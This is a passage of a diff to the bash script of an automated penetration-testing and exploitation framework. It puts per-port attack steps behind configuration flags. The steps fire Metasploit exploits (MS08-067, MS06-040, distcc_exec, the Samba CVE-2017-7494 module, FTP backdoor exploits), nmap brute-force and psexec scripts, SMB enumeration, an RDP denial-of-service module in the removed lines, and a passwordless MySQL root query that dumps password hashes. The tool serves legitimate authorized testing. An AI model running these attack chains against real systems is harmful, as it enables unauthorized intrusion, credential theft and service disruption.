+    cutycapt --url=https://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port443.jpg --insecure --max-wait=5000 2> /dev/null
   fi
   echo -e "$OKRED[+]$RESET Screenshot saved to $LOOT_DIR/screenshots/$TARGET-port443.jpg"
 
   source $INSTALL_DIR/modes/normal_webporthttps.sh
-
-  if [ $SCAN_TYPE == "DOMAIN" ] && [ $OSINT == "1" ]; then
-    if [ -z $GHDB ]; then
-      if [ $OSINT == "0" ]; then
-        echo -e "${OKGREEN}====================================================================================${RESET}"
-        echo -e "$OKRED SKIPPING GOOGLE HACKING QUERIES $RESET"
-        echo -e "${OKGREEN}====================================================================================${RESET}"
-      else
-        echo -e "${OKGREEN}====================================================================================${RESET}"
-        echo -e "$OKRED RUNNING GOOGLE HACKING QUERIES $RESET"
-        echo -e "${OKGREEN}====================================================================================${RESET}"
-        goohak $TARGET > /dev/null
-      fi
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING INURLBR OSINT QUERIES $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      php $INURLBR --dork "site:$TARGET" -s inurlbr-$TARGET.txt | tee $LOOT_DIR/osint/inurlbr-$TARGET.txt
-      rm -Rf output/ cookie.txt exploits.conf
-    fi
-  fi
+  source $INSTALL_DIR/modes/osint_stage_2.sh
 fi
 
-if [ -z "$port_445" ];
-then
+if [ -z "$port_445" ]; then
   echo -e "$OKRED + -- --=[Port 445 closed... skipping.$RESET"
-elif [ $SMB = "1" ];
-then
+elif [ $SMB = "1" ]; then
   echo -e "$OKRED + -- --=[Port 445 scanned... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 445 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED ENUMERATING SMB/NETBIOS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  enum4linux $TARGET
-  python $SAMRDUMP $TARGET
-  nbtscan $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV -Pn -T5 -p445 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smb-protocols --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; use auxiliary/scanner/smb/smb_version; run; use auxiliary/scanner/smb/pipe_auditor; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; use exploit/windows/smb/ms06_040_netapi; run; use exploit/windows/smb/ms05_039_pnp; run; use exploit/windows/smb/ms10_061_spoolss; run; use exploit/windows/smb/ms09_050_smb2_negotiate_func_index; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_ms17_010; run; exit;"
+  if [ "$SMB_ENUM" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED ENUMERATING SMB/NETBIOS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    enum4linux $TARGET | tee $LOOT_DIR/output/enum4linux-$TARGET-port445.txt
+    python $SAMRDUMP $TARGET | tee $LOOT_DIR/output/samrdump-$TARGET-port445.txt
+    nbtscan $TARGET | tee $LOOT_DIR/output/nbtscan-$TARGET-port445.txt
+  fi
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -sV -Pn -T5 -p445 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smb-protocols --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port445.txt
+  fi
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; use auxiliary/scanner/smb/smb_version; run; use auxiliary/scanner/smb/pipe_auditor; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; use exploit/windows/smb/ms06_040_netapi; run; use exploit/windows/smb/ms05_039_pnp; run; use exploit/windows/smb/ms10_061_spoolss; run; use exploit/windows/smb/ms09_050_smb2_negotiate_func_index; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_ms17_010; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port445.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port445.raw > $LOOT_DIR/output/msf-$TARGET-port445.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port445.raw 2> /dev/null
+  fi
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING SAMBA ARBITRARY MODULE LOAD CVE-2017-7494 $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use linux/samba/is_known_pipename; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port445-is_known_pipename.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port445-is_known_pipename.raw > $LOOT_DIR/output/msf-$TARGET-port445-is_known_pipename.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port445-is_known_pipename.raw 2> /dev/null
+  fi
 fi
 
 if [ -z "$port_512" ];
@@ -596,10 +724,12 @@ then
   echo -e "$OKRED + -- --=[Port 512 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 512 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV -Pn -T5 -p 512 --script=rexec* $TARGET
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -sV -Pn -T5 -p 512 --script=rexec* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port512.txt
+  fi
 fi
 
 if [ -z "$port_513" ]
@@ -607,10 +737,12 @@ then
   echo -e "$OKRED + -- --=[Port 513 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 513 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV -T5 -Pn -p 513 --script=rlogin* $TARGET
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -sV -T5 -Pn -p 513 --script=rlogin* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port513.txt
+  fi
 fi
 
 if [ -z "$port_514" ];
@@ -618,37 +750,9 @@ then
   echo -e "$OKRED + -- --=[Port 514 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 514 opened... running tests...$RESET"
-  amap $TARGET 514 -A
-fi
-
-if [ -z "$port_623" ];
-then
-  echo -e "$OKRED + -- --=[Port 623 closed... skipping.$RESET"
-else
-  echo -e "$OKORANGE + -- --=[Port 623 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING AMAP $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  amap $TARGET 623 -A
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV -Pn -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 623 $TARGET
-fi
-
-if [ -z "$port_624" ];
-then
-  echo -e "$OKRED + -- --=[Port 624 closed... skipping.$RESET"
-else
-  echo -e "$OKORANGE + -- --=[Port 624 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING AMAP $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  amap $TARGET 624 -A
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV -Pn -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 624 $TARGET
+  if [ "$AMAP" = "1" ]; then
+    amap $TARGET 514 -A
+  fi
 fi
 
 if [ -z "$port_1099" ];
@@ -656,19 +760,29 @@ then
   echo -e "$OKRED + -- --=[Port 1099 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 1099 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING AMAP $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  amap $TARGET 1099 -A
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV -Pn -T5 -p 1099 --script=rmi-* $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use gather/java_rmi_registry; set RHOST "$TARGET"; run;"
-  msfconsole -q -x "use scanner/misc/java_rmi_server; set RHOST "$TARGET"; run;"
+  if [ "$AMAP" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING AMAP $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    amap $TARGET 1099 -A
+  fi
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -sV -Pn -T5 -p 1099 --script=rmi-* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port1099.txt
+  fi
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "use gather/java_rmi_registry; set RHOST "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_registry.txt
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_registry.raw > $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_registry.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_registry.raw 2> /dev/null
+    msfconsole -q -x "use scanner/misc/java_rmi_server; set RHOST "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_server.txt
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_server.raw > $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_server.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_server.raw 2> /dev/null
+  fi
 fi
 
 if [ -z "$port_1433" ];
@@ -676,10 +790,12 @@ then
   echo -e "$OKRED + -- --=[Port 1433 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 1433 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV -Pn -T5 --script=ms-sql* -p 1433 $TARGET
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -sV -Pn -T5 --script=ms-sql* -p 1433 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port1433.txt
+  fi
 fi
 
 if [ -z "$port_2049" ];
@@ -687,37 +803,30 @@ then
   echo -e "$OKRED + -- --=[Port 2049 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 2049 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV -Pn -T5 --script=nfs* -p 2049 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING RPCINFO $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  rpcinfo -p $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING SHOWMOUNT $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  showmount -e $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED CHECKING FOR NULL SHARES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  smbclient -L $TARGET -U " "%" "
-fi
-
-if [ -z "$port_2121" ];
-then
-  echo -e "$OKRED + -- --=[Port 2121 closed... skipping.$RESET"
-else
-  echo -e "$OKORANGE + -- --=[Port 2121 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV -Pn -T5 --script=ftp* -p 2121 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "setg PORT 2121; use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use unix/ftp/proftpd_133c_backdoor; run; exit;"
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -sV -Pn -T5 --script=nfs* -p 2049 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port2049.txt
+  fi
+  if [ "$RPC_INFO" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING RPCINFO $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    rpcinfo -p $TARGET
+  fi
+  if [ "$SHOW_MOUNT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING SHOWMOUNT $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    showmount -e $TARGET
+  fi
+  if [ "$SMB_ENUM" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED CHECKING FOR NULL SHARES $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    smbclient -L $TARGET -U " "%" " 
+  fi
 fi
 
 if [ -z "$port_3306" ];
@@ -725,15 +834,20 @@ then
   echo -e "$OKRED + -- --=[Port 3306 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 3306 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV -Pn --script=mysql* -p 3306 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use auxiliary/scanner/mssql/mssql_ping; setg RHOSTS \"$TARGET\"; run; back; exit;"
-  mysql -u root -h $TARGET -e 'SHOW DATABASES; SELECT Host,User,Password FROM mysql.user;'
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -sV -Pn --script=mysql* -p 3306 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port3306.txt
+  fi
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "use auxiliary/scanner/mssql/mssql_ping; setg RHOSTS \"$TARGET\"; run; back; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port3306-mssql_ping.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port3306-mssql_ping.raw > $LOOT_DIR/output/msf-$TARGET-port3306-mssql_ping.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port3306-mssql_ping.raw 2> /dev/null
+  fi
 fi
 
 if [ -z "$port_3310" ];
@@ -744,7 +858,9 @@ else
   echo -e "${OKGREEN}====================================================================================${RESET}"
   echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -p 3310 -Pn -T5 -sV  --script clamav-exec $TARGET
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    nmap -A -p 3310 -Pn -T5 -sV  --script clamav-exec $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port3310.txt
+  fi
 fi
 
 if [ -z "$port_3128" ];
@@ -752,10 +868,12 @@ then
   echo -e "$OKRED + -- --=[Port 3128 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 3128 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -p 3128 -Pn -T5 -sV  --script=*proxy* $TARGET
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -p 3128 -Pn -T5 -sV  --script=*proxy* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port3128.txt
+  fi
 fi
 
 if [ -z "$port_3389" ];
@@ -763,14 +881,20 @@ then
   echo -e "$OKRED + -- --=[Port 3389 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 3389 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV -Pn -T5 --script=rdp-* -p 3389 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use auxiliary/scanner/rdp/ms12_020_check; setg RHOSTS \"$TARGET\"; run; use auxiliary/dos/windows/rdp/ms12_020_maxchannelids; run; back; exit;"
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -sV -Pn -T5 --script=rdp-* -p 3389 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port3389.txt
+  fi
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "use auxiliary/scanner/rdp/ms12_020_check; setg RHOSTS \"$TARGET\"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port3389-ms12_020_check.txt
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port3389-ms12_020_check.raw > $LOOT_DIR/output/msf-$TARGET-port3389-ms12_020_check.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port3389-ms12_020_check.raw 2> /dev/null
+  fi
   echo -e "${OKGREEN}====================================================================================${RESET}"
   echo -e "$OKRED RUNNING RDESKTOP CONNECTION $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
@@ -782,39 +906,20 @@ then
   echo -e "$OKRED + -- --=[Port 3632 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 3632 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV -Pn -T5 --script=distcc-* -p 3632 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use unix/misc/distcc_exec; run; exit;"
-fi
-
-if [ -z "$port_4443" ];
-then
-  echo -e "$OKRED + -- --=[Port 4443 closed... skipping.$RESET"
-else
-  echo -e "$OKORANGE + -- --=[Port 4443 opened... running tests...$RESET"
-  wafw00f http://$TARGET:4443
-  echo ""
-  whatweb -a 3 http://$TARGET:4443
-  echo ""
-  sslscan --no-failed $TARGET:4443
-  sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET:4443
-  if [ "$NIKTO" = "1" ]; then
-    nikto -h https://$TARGET:4443 -output $LOOT_DIR/web/nikto-$TARGET-https-4443.txt
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -sV -Pn -T5 --script=distcc-* -p 3632 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port3632.txt
   fi
-  if [ ${DISTRO} == "blackarch"  ]; then
-    /bin/CutyCapt --url=https://$TARGET:4443 --out=$LOOT_DIR/screenshots/$TARGET-port4443.jpg --insecure --max-wait=1000 2> /dev/null
-  else
-    cutycapt --url=https://$TARGET:4443 --out=$LOOT_DIR/screenshots/$TARGET-port4443.jpg --insecure --max-wait=1000 2> /dev/null
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use unix/misc/distcc_exec; run; exit;"| tee $LOOT_DIR/output/msf-$TARGET-port3632-distcc_exec.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port3632-distcc_exec.raw > $LOOT_DIR/output/msf-$TARGET-port3632-distcc_exec.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port3632-distcc_exec.raw 2> /dev/null
   fi
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -sV -Pn -A -p 4443 -T5 --script=*proxy* $TARGET
 fi
 
 if [ -z "$port_5432" ];
@@ -822,14 +927,20 @@ then
   echo -e "$OKRED + -- --=[Port 5432 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 5432 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV -Pn --script=pgsql-brute -p 5432 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use auxiliary/scanner/postgres/postgres_login; setg RHOSTS "$TARGET"; run; exit;"
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -sV -Pn --script=pgsql-brute -p 5432 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port5432.txt
+  fi
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "use auxiliary/scanner/postgres/postgres_login; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port5432-postgres_login.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port5432-postgres_login.raw > $LOOT_DIR/output/msf-$TARGET-port5432-postgres_login.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port5432-postgres_login.raw 2> /dev/null
+  fi
 fi
 
 if [ -z "$port_5555" ];
@@ -849,10 +960,12 @@ then
   echo -e "$OKRED + -- --=[Port 5800 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 5800 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV -Pn -T5 --script=vnc* -p 5800 $TARGET
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
